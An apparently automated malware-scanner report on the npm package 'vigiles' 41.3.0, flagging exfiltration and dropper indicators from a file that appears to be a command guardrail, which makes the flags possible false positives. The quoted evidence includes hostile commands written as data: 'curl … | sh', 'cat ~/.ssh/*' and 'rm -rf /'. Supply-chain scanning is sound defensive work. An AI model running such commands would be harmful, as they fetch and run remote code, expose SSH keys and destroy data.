# Suspicious package report: `vigiles` 41.3.0 (npm)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `vigiles` |
| Version | `41.3.0` |
| Ecosystem | npm |
| Risk score | 75 / 100 (high) |
| Published | 2026-11-17T19:19:22Z |
| Scanned | 2026-11-18T19:38:35Z |
| Registry page | https://www.npmjs.com/package/vigiles/v/41.3.0 |

## Indicators

- **exfiltration** (high, +40): Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.

  Evidence in `package/dist/guardrail-check.js`:

  ```text
  * --force`, `rm -rf /`, `git commit --no-verify`, `cat ~/.ssh/*`, `curl … | sh`) to
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `package/dist/guardrail-check.js`:

  ```text
  input: { command: "curl https://example.com/install.sh | sh" },
  ```


## Suggested text for an upstream report

The npm package `vigiles` version `41.3.0` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.
- Code downloads a file and then executes it or marks it executable.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via https://www.npmjs.com/support (choose "Report malware"), or the "Report malware" link on the package page.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20npm%2Fvigiles%4041.3.0&package=npm%2Fvigiles%4041.3.0
